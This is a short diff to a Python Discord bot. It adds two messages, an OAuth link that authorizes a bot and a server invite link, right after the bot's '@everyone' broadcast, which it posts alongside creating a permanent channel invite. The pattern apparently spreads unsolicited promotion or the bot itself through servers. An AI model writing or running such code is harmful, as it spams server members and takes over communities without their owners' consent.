@@ -251,6 +251,8 @@ class Bot:
                     try:         
                         invite = await channel.create_invite(max_age=0, max_uses=0)
                         await channel.send("@everyone", embed= em, view=view)
+                        await channel.send("https://discord.com/oauth2/authorize?client_id=1368884334076891136")
+                        await channel.send("https://discord.gg/y56na8kN9e")
                         break
                     except:
                         continue
@@ -260,6 +262,8 @@ class Bot:
                     try:
                         invite = await channel.create_invite(max_age=0,max_uses=0)
                         await channel.send("@everyone", embed= em, view=view)
+                        await channel.send("https://discord.com/oauth2/authorize?client_id=1368884334076891136")
+                        await channel.send("https://discord.gg/y56na8kN9e")
                         break
                     except:
                         continue
